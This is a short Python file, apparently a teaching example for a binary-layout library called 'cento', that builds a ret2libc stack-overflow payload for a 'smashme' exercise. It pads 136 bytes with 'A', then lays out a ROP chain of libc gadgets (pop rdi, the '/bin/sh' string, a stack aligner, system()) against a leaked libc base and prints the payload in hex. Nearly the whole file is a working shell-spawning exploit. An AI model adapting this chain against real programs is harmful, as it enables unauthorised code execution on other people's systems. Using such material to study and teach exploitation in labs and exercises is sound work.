#!/usr/bin/env python3
# Copyright (c) 2026 Zetier
# SPDX-License-Identifier: Apache-2.0
# mypy: disable-error-code="assignment"
# smashme-ret2libc, mapped to cento: the b"A" pad is the region FILL, the leak
# is a SYMBOL, and the chain is ONE View -- a stack of one-slot frames, each
# named for the REGISTER it lands in (ex01_find_your_offset's SavedRegs framing), declared AND
# assigned in four lines. Byte-identical to before.py (run check.py and see);
# the payoff is in refusal.py.
import cento

LIBC = cento.Ref("libc_base")  # the leak; one bind() at throw time completes every cell below


class RopFrames(cento.View):
    rip: cento.u64 = LIBC + 0x02A3E5  # the smashed ret: rip <- pop rdi ; ret
    rdi: cento.u64 = LIBC + 0x1B45BD  # the gadget pops this: rdi <- "/bin/sh"
    rip2: cento.u64 = LIBC + 0x029CD6  # its ret: rip <- ret (movaps aligner: rsp%16==0)
    rip3: cento.u64 = LIBC + 0x052290  # the aligner's ret: rip <- system() -- and done


OFFSET = 136  # 128 buf + 8 saved rbp = saved RIP

stack = cento.region("stack", max_size=OFFSET + len(RopFrames), fill="A", endian="little")
stack.at(OFFSET, RopFrames, name="frames")  # placing the declaration writes the chain

if __name__ == "__main__":
    stack.bind("libc_base", 0x00007F1FBABC0000, source="puts(got.puts) leak")
    print(f"after  payload: {stack.image().hex()}")
